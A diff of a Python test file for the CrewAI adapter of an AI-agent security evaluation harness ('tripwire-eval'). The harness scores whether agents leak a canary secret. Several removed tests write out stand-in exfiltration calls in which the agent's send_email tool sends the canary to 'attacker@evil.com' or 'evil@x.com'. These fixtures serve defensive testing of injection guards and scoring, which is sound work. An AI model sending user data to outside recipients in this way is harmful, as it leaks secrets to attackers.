@@ -1,30 +1,26 @@
 """CrewAI adapter tests.
 
 CrewAI is an optional, heavy dependency and is deliberately NOT in the `dev`
-extra, so these tests never import it. That is not a coverage gap: the adapter
-records its trace at the tool boundary (see crewai_adapter._ToolRecorder), so
-every behavior scoring and the defense ladder depend on -- requested args, guard
-denial before execution, result wrapping, unavailable tools -- is exercised here
-directly, offline and deterministically, exactly like the rest of the suite.
+extra, so these tests never import it. The adapter records its trace at the
+tool boundary (see crewai_adapter._ToolRecorder), so the recorder's contract
+-- requested args, guard denial before execution, result wrapping, unavailable
+tools -- is exercised directly, and CrewAIAdapter.run() itself (the agent, task
+and crew it builds, the budget it passes, the trace it returns) runs over the
+stub framework in tests/fake_crewai.py. Both are offline and deterministic,
+exactly like the rest of the suite.
 
-What is NOT covered without crewai installed: that CrewAI itself drives the loop
-and calls the tools. The `pip install 'tripwire-eval[crewai]'` path is what
-exercises that; `test_live_crew_smoke` runs it when available.
+What is NOT covered: that real CrewAI drives the loop the way the stub does.
+The `pip install 'tripwire-eval[crewai]'` path is what exercises that.
 """
 
 from __future__ import annotations
 
 import pytest
 
-from tripwire.adapters.base import Adapter, EpisodeSpec, NormalizedTrace, TraceStep
-from tripwire.adapters.crewai_adapter import (
-    _INSTALL_HINT,
-    CrewAIAdapter,
-    _ToolRecorder,
-    build_args_model,
-)
-from tripwire.adapters.loader import ADAPTER_REGISTRY, resolve_adapters
-from tripwire.harness.judge import attack_exfiltrated, attack_grade, task_completed
+from tripwire.adapters.base import Adapter, EpisodeSpec, TraceStep
+from tripwire.adapters.crewai_adapter import CrewAIAdapter, _ToolRecorder, build_args_model
+from tripwire.adapters.loader import resolve_adapters
+from tripwire.harness.judge import attack_exfiltrated
 
 CANARY = "deadbeefdeadbeefdeadbeefdeadbeef"
 
@@ -59,22 +55,10 @@ def test_adapter_satisfies_protocol_without_crewai_installed():
     assert isinstance(CrewAIAdapter(), Adapter)
 
 
-def test_adapter_name_is_crewai():
-    assert CrewAIAdapter().name == "crewai"
-
-
-def test_registry_contains_crewai():
-    assert ADAPTER_REGISTRY["crewai"] is CrewAIAdapter
-
-
 def test_resolve_adapters_builds_crewai():
     (adapter,) = resolve_adapters(["crewai"])
     assert isinstance(adapter, CrewAIAdapter)
     assert adapter.name == "crewai"
-
-
-def test_install_hint_names_the_extra():
-    assert "tripwire-eval[crewai]" in _INSTALL_HINT
 
 
 # --- the recorder: the scoring contract --------------------------------------
@@ -88,13 +72,6 @@ def test_records_tool_call_with_args_then_result():
     assert steps[0].name == "send_email"
     assert steps[0].args == {"to": "a@corp.com", "body": "hi"}
     assert steps[1].content == "email sent"
-
-
-def test_step_indices_are_sequential():
-    recorder, steps = _recorder()
-    recorder.invoke("send_email", {"to": "a@corp.com", "body": "one"})
-    recorder.invoke("send_email", {"to": "b@corp.com", "body": "two"})
-    assert [s.step for s in steps] == [0, 1, 2, 3]
 
 
 def test_guard_denial_records_blocked_and_never_executes():
@@ -113,21 +90,6 @@ def test_guard_denial_records_blocked_and_never_executes():
     assert out == "blocked by test guard"
     assert [s.type for s in steps] == ["tool_call", "tool_blocked"]
     assert steps[1].content == "blocked by test guard"
-
-
-def test_blocked_call_records_the_requested_args_anyway():
-    """A blocked call still records what the model TRIED -- otherwise an
-    adaptive attacker and a human reading the trace lose the evidence."""
-    recorder, steps = _recorder(guard=lambda name, args: (False, "denied"))
-    recorder.invoke("send_email", {"to": "evil@x.com", "body": CANARY})
-    assert steps[0].args["body"] == CANARY
-
-
-def test_guard_allowing_executes_normally():
-    recorder, steps = _recorder(guard=lambda name, args: (True, ""))
-    out = recorder.invoke("send_email", {"to": "a@corp.com", "body": "hi"})
-    assert out == "email sent"
-    assert [s.type for s in steps] == ["tool_call", "tool_result"]
 
 
 def test_result_wrapper_applied_to_real_output():
@@ -154,49 +116,6 @@ def test_unavailable_tool_is_blocked_not_crashed():
     out = recorder.invoke("send_email", {"to": "a@corp.com", "body": "hi"})
     assert "not available" in out
     assert [s.type for s in steps] == ["tool_call", "tool_blocked"]
-
-
-def test_no_guard_means_always_allowed():
-    recorder, steps = _recorder(guard=None)
-    recorder.invoke("send_email", {"to": "a@corp.com", "body": "hi"})
-    assert [s.type for s in steps] == ["tool_call", "tool_result"]
-
-
-# --- the trace the recorder builds is judged correctly -----------------------
-
-def test_leak_to_unauthorized_recipient_scores_as_exfiltration():
-    recorder, steps = _recorder()
-    recorder.invoke("send_email", {"to": "attacker@evil.com", "body": f"id: {CANARY}"})
-    trace = NormalizedTrace(steps=steps, final_output="done")
-    assert attack_exfiltrated(trace, CANARY) is True
-
-
-def test_canary_to_authorized_recipient_is_not_exfiltration():
-    recorder, steps = _recorder()
-    recorder.invoke("send_email", {"to": "accounting@corp.com", "body": f"id: {CANARY}"})
-    trace = NormalizedTrace(steps=steps, final_output="done")
-    assert attack_exfiltrated(trace, CANARY) is False
-    assert attack_grade(trace, CANARY) == 2  # surfaced, but in-channel
-
-
-def test_blocked_leak_is_not_scored_as_a_leak():
-    """The whole reason blocked calls are typed tool_blocked: a defense that
-    stopped the send must not read as a successful exfiltration."""
-    recorder, steps = _recorder(guard=lambda name, args: (False, "denied"))
-    recorder.invoke("send_email", {"to": "attacker@evil.com", "body": f"id: {CANARY}"})
-    trace = NormalizedTrace(steps=steps, final_output="")
-    assert attack_exfiltrated(trace, CANARY) is False
-    assert attack_grade(trace, CANARY) == 0
-
-
-def test_benign_task_completion_is_visible_in_the_trace():
-    recorder, steps = _recorder()
-    recorder.invoke(
-        "send_email",
-        {"to": "accounting@corp.com", "body": "Invoice #4471 total: $2,480.00"},
-    )
-    trace = NormalizedTrace(steps=steps, final_output="done")
-    assert task_completed(trace) is True
 
 
 # --- OpenAI schema -> pydantic args model ------------------------------------
@@ -232,26 +151,6 @@ def test_args_model_unknown_type_falls_back_to_any():
     params = {"type": "object", "properties": {"weird": {"type": "nonesuch"}}}
     instance = build_args_model("t", params)(weird={"anything": 1})
     assert instance.weird == {"anything": 1}
-
-
-# --- live path (only when the optional dependency is installed) --------------
-
-def test_live_crew_smoke():
-    """End-to-end through real CrewAI, if it is installed. Skipped on a core
-    install -- see the module docstring."""
-    pytest.importorskip("crewai", reason="optional extra: pip install 'tripwire-eval[crewai]'")
-
-    from tripwire.adapters.crewai_adapter import _build_tool
-
-    recorder, steps = _recorder()
-    tool = _build_tool(SEND_EMAIL_SCHEMA, recorder)
-
-    assert tool.name == "send_email"
-    # Driving the CrewAI tool must route through the recorder, so the trace is
-    # built the same way it is under a real crew run.
-    tool.run(to="a@corp.com", body="hi")
-    assert [s.type for s in steps] == ["tool_call", "tool_result"]
-    assert steps[0].args == {"to": "a@corp.com", "body": "hi"}
 
 
 # --- CrewAIAdapter.run() through a stub crewai package -----------------------------
